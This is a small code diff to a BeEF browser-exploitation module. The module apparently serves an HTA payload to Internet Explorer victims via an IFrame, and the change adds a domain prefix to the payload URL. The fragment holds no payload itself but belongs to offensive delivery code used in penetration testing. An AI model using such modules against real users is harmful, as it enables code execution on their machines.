@@ -4,9 +4,9 @@
 // See the file 'doc/COPYING' for copying permission
 //
 
-beef.execute(function () {
+beef.execute(function(){
 
-    var hta_url = '<%= @ps_url %>' + '/hta';
+    var hta_url = '<%= @domain %>' + '<%= @ps_url %>' + '/hta';
 
     if (beef.browser.isIE()) {
         // application='yes' is IE-only and needed to load the HTA into an IFrame.
